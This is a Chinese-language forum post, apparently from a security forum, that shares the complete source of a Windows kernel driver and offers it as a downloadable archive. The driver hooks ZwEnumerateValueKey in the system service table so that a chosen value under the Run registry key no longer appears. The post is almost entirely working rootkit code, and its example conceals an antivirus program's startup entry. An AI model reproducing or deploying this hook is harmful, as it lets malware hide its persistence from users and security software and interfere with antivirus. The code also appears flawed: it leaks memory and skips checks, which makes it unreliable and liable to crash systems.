
# 隐藏注册表的键值

> 原文：[`www.pediy.com/kssd/pediy10/103907.html`](https://www.pediy.com/kssd/pediy10/103907.html)

写了个简单的隐藏注册表键值的驱动，通过 HOOK `ZwEnumerateValueKey` 来实现，这里把代码贴出来：

![124.gif](img/792ac17acdd6fd3e39fc1aacdcf4c3d9.jpg)

```
#include <ntddk.h>
#include <stdio.h>

//定义 ObQueryNameString
NTSYSAPI NTSTATUS NTAPI ObQueryNameString(
        IN PVOID Object,
    OUT PVOID ObjectNameInfo,
    IN ULONG Length,
    OUT PULONG ReturnLength
);

//定义 ZwEnumerateValueKey
NTSYSAPI NTSTATUS NTAPI ZwEnumerateValueKey(
    IN HANDLE KeyHandle,
    IN ULONG Index,
    IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT PVOID KeyValueInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
);

//定义要 Hook 的 API 函数原型
NTSTATUS MyZwEnumerateValueKey(
    IN HANDLE KeyHandle,
    IN ULONG Index,
    IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT PVOID KeyValueInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
);

//声明函数指针，并且函数返回值为 NTSTATUS 类型
typedef NTSTATUS (*REALZWENUMERATEVALUEKEY)(
       IN HANDLE KeyHandle,
    IN ULONG Index,
    IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT PVOID KeyValueInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
);

REALZWENUMERATEVALUEKEY RealZwEnumerateValueKey=NULL;

//这就是要隐藏的键值，这里我隐藏的键值是瑞星杀毒软件的启动项，你也可以改成别的
PWSTR HideValue=L"RavTray";

#pragma pack(1)
typedef struct ServiceDescriptorEntry{
    unsigned int  *ServiceTableBase;
    unsigned int  *ServiceCounterTableBase;
    unsigned int  *NumberOfServices; 
    unsigned char *ParamTableBase;
}ServiceDescriptorTableEntry_t,*PServiceDescriptorTableEntry_t;
#pragma pack()

_declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
#define SYSCALL(_function) KeServiceDescriptorTable.ServiceTableBase[*((PULONG) _function+1)]

NTSTATUS HookApi();
NTSTATUS UnHook();
PVOID GetPointer(HANDLE handle);
NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject);

PVOID GetPointer(HANDLE handle)
{
PVOID pKey;
if(!handle) return NULL;
if (ObReferenceObjectByHandle(handle,0,NULL,KernelMode,&pKey,NULL)!=STATUS_SUCCESS)
{
pKey=NULL;
}
return pKey;
}

NTSTATUS MyZwEnumerateValueKey(
    IN HANDLE KeyHandle,
    IN ULONG Index,
    IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT PVOID KeyValueInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
    )
{
  PVOID pKey;
  UNICODE_STRING *pUniName;
  ULONG actuallen;
  UNICODE_STRING uStrValueName;
  ANSI_STRING keyname;
  NTSTATUS status;
  PWSTR ValueName;
  ULONG NameLen;

  status=((REALZWENUMERATEVALUEKEY)(RealZwEnumerateValueKey))(
                            KeyHandle,
                        Index,
                        KeyValueInformationClass,
                        KeyValueInformation,
                          Length,
                          ResultLength);

   pKey=GetPointer(KeyHandle);

   if (pKey)
   {
    pUniName=ExAllocatePool(NonPagedPool,1024*2);
  pUniName->MaximumLength=512*2;
  memset(pUniName,0,pUniName->MaximumLength);

  if(NT_SUCCESS(ObQueryNameString(pKey,pUniName,512*2,&actuallen)))
  {
     RtlUnicodeStringToAnsiString(&keyname,pUniName,TRUE);

   DbgPrint("%ws\n",pUniName->Buffer);

   keyname.Buffer=_strupr(keyname.Buffer);

   if (strcmp(keyname.Buffer,"\\REGISTRY\\MACHINE\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN")==0)
    {
        ValueName = ((PKEY_VALUE_FULL_INFORMATION)KeyValueInformation)->Name;

        if (ValueName!=NULL&&wcsstr(ValueName,HideValue)!=NULL)
        {
        Index++;
    ValueName=NULL;
    return ((REALZWENUMERATEVALUEKEY)(RealZwEnumerateValueKey))(
                            KeyHandle,
                        Index,
                        KeyValueInformationClass,
                        KeyValueInformation,
                          Length,
                          ResultLength);
    }

  //DbgPrint("ValueName=%ws\n",ValueName);

     }
   }
  }
return ((REALZWENUMERATEVALUEKEY)(RealZwEnumerateValueKey))(
                            KeyHandle,
                        Index,
                        KeyValueInformationClass,
                        KeyValueInformation,
                          Length,
                          ResultLength);
}

NTSTATUS HookApi()
{
    RealZwEnumerateValueKey = (REALZWENUMERATEVALUEKEY)SYSCALL(ZwEnumerateValueKey);

_asm{
   mov eax,cr0
   and eax,not 10000h
   mov cr0,eax
    }
(REALZWENUMERATEVALUEKEY)SYSCALL(ZwEnumerateValueKey)=MyZwEnumerateValueKey;

_asm{
   mov eax,cr0
   or eax,10000h
   mov cr0,eax
}

return( STATUS_SUCCESS );
}

NTSTATUS UnHook()
{
_asm{
   mov eax,cr0
   and eax,not 10000h
   mov cr0,eax
}
(REALZWENUMERATEVALUEKEY)SYSCALL(ZwEnumerateValueKey) = RealZwEnumerateValueKey;

_asm{
   mov eax,cr0
   or eax,10000h
   mov cr0,eax
}

return STATUS_SUCCESS ;
}

NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
NTSTATUS status;
DbgPrint("OnUnload called!\n");
status=UnHook();
return status;
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject,
       IN PUNICODE_STRING theRegistryPath)
{
  theDriverObject->DriverUnload=DriverUnload;
    HookApi();
  DbgPrint("Hook Called!\n");
  return STATUS_SUCCESS ;
}
```

下面把源代码发上来：

上传的附件

| ![RegHook.rar](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || RegHook.rar |
